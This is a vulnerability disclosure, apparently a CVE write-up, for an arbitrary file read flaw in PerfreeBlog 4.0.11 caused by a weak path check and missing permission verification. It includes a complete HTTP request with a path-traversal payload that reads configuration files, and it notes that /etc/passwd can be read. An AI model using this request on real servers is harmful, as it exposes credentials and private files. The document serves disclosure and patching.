# Arbitrary File Read Vulnerability in PerfreeBlog System(CVE-2025-60729)

## Official Website
https://perfree.org.cn/

## Download Link
https://gitee.com/PerfreeBlog/PerfreeBlog


## Vulnerability Description
The PerfreeBlog system has an arbitrary file read vulnerability, which allows reading any files on the server.


## Vulnerable Version
Latest version 4.0.11


## Vulnerability Principle
The relevant code details are as follows:
In the interface called to obtain the content of theme files
![](./img/3.png)

It is found that it uses the `validThemeFilePath` function to verify the legitimacy of the path
![](./img/1.png)

When entering the `validThemeFilePath` function, it is found that the verification conditions are:
1. The path must exist and not be empty.
2. The incoming `path` must contain the `themePath`.

Therefore, path traversal can be achieved using `../`.
![](./img/2.png)

Moreover, this vulnerable interface has an unauthorized access issue. It is found that it does not use `hasPermission` for permission verification, so registered users can be used to read any files on the server.
![](./img/8.png)


## Vulnerability Reproduction
It can be equivalent to an unauthorized file read vulnerability.

First, use the `Authorization` of a newly registered ordinary user for operation, which is equivalent to an unauthorized operation.
![](./img/9.png)


Obtaining the absolute path:
Access the following interface to obtain the absolute path. The principle is that the downloaded file does not exist.
http://127.0.0.1:8086/api/attach/file/1/get/22222
![](./img/10.png)

Modify `path` and `themePath` to achieve arbitrary file reading.

The interface is:
```
http://127.0.0.1:8086/api/auth/theme/getThemeFileContent
```

The `path` only needs to contain `themePath`.

Data packet:
```
POST /api/auth/theme/getThemeFileContent HTTP/1.1
Host: 127.0.0.1:8086
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0MTIzIiwiaXNzIjoic2VjdXJpdHkiLCJpYXQiOjE3NTU1MTQ0MzksImF1ZCI6InNlY3VyaXR5LWFsbCIsImV4cCI6MTc1NTUyMTYzOX0.KYmf_1EgVHrVoEy_N8tWPXH9SyNtEVHHvcjCLP3Oocg
Content-Length: 202
Origin: http://127.0.0.1:8086
Connection: keep-alive
Referer: http://127.0.0.1:8086/admin/theme/edit/default
Cookie: cms.locale=zh; PUBLICCMS_ANALYTICS_ID=b949b56a-32b4-4c16-9017-6619c6601ec5; PUBLICCMS_ADMIN=1_2a8f2932-74c5-40b9-ac72-01ef30167826; JSESSIONID=9DEEB713CA3E50909F7E86A3377C4366
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

{"themePath":"default\\..\\..\\..\\..\\","path":"F:\\test\\java1\\PerfreeBlog-main\\resources\\static\\themes\\default\\..\\..\\..\\..\\perfree-server\\src\\main\\resources\\application-prod.yaml"}
```

`themePath` is set to:
```
default\\..\\..\\..\\..\\
```


Reading pom.xml:

The `path` is:
```
File path + resources\\static\\themes\\default\\..\\..\\..\\..\\pom.xml
```
![](./img/6.png)

Reading configuration files:

The `path` is:
```
File path + resources\\static\\themes\\default\\..\\..\\..\\..\\perfree-server\\src\\main\\resources\\application-prod.yaml
```
![](./img/7.png)

For Linux systems, files such as `/etc/passwd` can be read.


Location of the vulnerable interface in the menu - Theme Management
![](./img/11.png)
